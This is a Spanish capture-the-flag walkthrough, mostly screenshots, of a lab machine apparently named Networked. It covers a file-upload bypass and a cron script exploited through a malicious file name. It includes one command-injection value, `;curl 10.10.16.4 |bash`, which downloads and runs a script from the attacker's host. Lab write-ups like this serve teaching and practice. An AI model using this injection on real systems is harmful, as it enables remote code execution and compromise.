...
![](<../assets/images/posts/2026-09-22-networked/Pasted image 20250127121659.png>)
...
![](<../assets/images/posts/2026-09-22-networked/Pasted image 20250127121900.png>)
...
![](<../assets/images/posts/2026-09-22-networked/Pasted image 20250127121919.png>)
___
### Puerto 80 - HTTP (Apache)

Al acceder a la página web alojada en el puerto **80** veremos el siguiente mensaje.

![](<../assets/images/posts/2026-09-22-networked/Pasted image 20250127123114.png>)
...
![](<../assets/images/posts/2026-09-22-networked/Pasted image 20250127123314.png>)

Al acceder al directorio **/backup** veremos un archivo llamado **backup.tar**.

![](<../assets/images/posts/2026-09-22-networked/Pasted image 20250127123334.png>)

Al descomprimir el fichero **.tar** veremos que contiene los ficheros de la página web, es decir el código fuente.

![](<../assets/images/posts/2026-09-22-networked/Pasted image 20250127123413.png>)
#### upload.php
...
![](<../assets/images/posts/2026-09-22-networked/Pasted image 20250127124344.png>)

En este mismo fichero veremos que comprueba que termine en una extensión válida (`.jpg`, `.png`, `.gif`, `.jpeg`)

![](<../assets/images/posts/2026-09-22-networked/Pasted image 20250127124107.png>)
#### lib.php
...
![](<../assets/images/posts/2026-09-22-networked/Pasted image 20250127124959.png>)

![](<../assets/images/posts/2026-09-22-networked/Pasted image 20250127125025.png>)

![](<../assets/images/posts/2026-09-22-networked/Pasted image 20250127124423.png>)

___
## Explotación
### Upload Arbitrary File | RCE

![](<../assets/images/posts/2026-09-22-networked/Pasted image 20250127125119.png>)

![](<../assets/images/posts/2026-09-22-networked/Pasted image 20250127125125.png>)

![](<../assets/images/posts/2026-09-22-networked/Pasted image 20250127125319.png>)

![](<../assets/images/posts/2026-09-22-networked/Pasted image 20250127125125.png>)

es debido a esta función en lib.php que obtiene el mime type real

![](<../assets/images/posts/2026-09-22-networked/Pasted image 20250127125353.png>)

![](<../assets/images/posts/2026-09-22-networked/Pasted image 20250127125501.png>)

![](<../assets/images/posts/2026-09-22-networked/Pasted image 20250127125508.png>)

![](<../assets/images/posts/2026-09-22-networked/Pasted image 20250127125524.png>)

![](<../assets/images/posts/2026-09-22-networked/Pasted image 20250127125529.png>)

![](<../assets/images/posts/2026-09-22-networked/Pasted image 20250127125549.png>)

tal y como habíamos visto en upload.php sabemos que se sube en uploads


![](<../assets/images/posts/2026-09-22-networked/Pasted image 20250127125709.png>)
...
![](<../assets/images/posts/2026-09-22-networked/Pasted image 20250127125947.png>)

Al dirigirnos a la home de dicho usuario (**/home/guly**) veremos dos archivos inusuales.

![](<../assets/images/posts/2026-09-22-networked/Pasted image 20250127130015.png>)

Uno de ellos es una tarea **Crontab** que se encarga de ejecutar **check_attack.php** cada 3 minutos.

![](<../assets/images/posts/2026-09-22-networked/Pasted image 20250127130023.png>)

El archivo **check_attack.php** contiene el siguiente código.

![](<../assets/images/posts/2026-09-22-networked/Pasted image 20250127130157.png>)

iterate por todos los fichero que hay en $path, es decir en **/var/www/html/uploads**

![](<../assets/images/posts/2026-09-22-networked/Pasted image 20250127130428.png>)

si es fichero index.html continua con el sigueitne

![](<../assets/images/posts/2026-09-22-networked/Pasted image 20250127130547.png>)
...
![](<../assets/images/posts/2026-09-22-networked/Pasted image 20250127130704.png>)
...
![](<../assets/images/posts/2026-09-22-networked/Pasted image 20250127130937.png>)

`;curl 10.10.16.4 |bash`

![](<../assets/images/posts/2026-09-22-networked/Pasted image 20250127131230.png>)
...
![](<../assets/images/posts/2026-09-22-networked/Pasted image 20250127131322.png>)

![](<../assets/images/posts/2026-09-22-networked/Pasted image 20250127132724.png>)

![](<../assets/images/posts/2026-09-22-networked/Pasted image 20250127131442.png>)

![](<../assets/images/posts/2026-09-22-networked/Pasted image 20250127132807.png>)

![](<../assets/images/posts/2026-09-22-networked/Pasted image 20250127131617.png>)
### Shell

![](<../assets/images/posts/2026-09-22-networked/Pasted image 20250127131824.png>)

[Error Reportado en Seclists](https://seclists.org/fulldisclosure/2019/Apr/24)

![](<../assets/images/posts/2026-09-22-networked/Pasted image 20250127132212.png>)
___
## Más allá del Root
### PHP - Misconfiguration

![](<../assets/images/posts/2026-09-22-networked/Pasted image 20250127134218.png>)
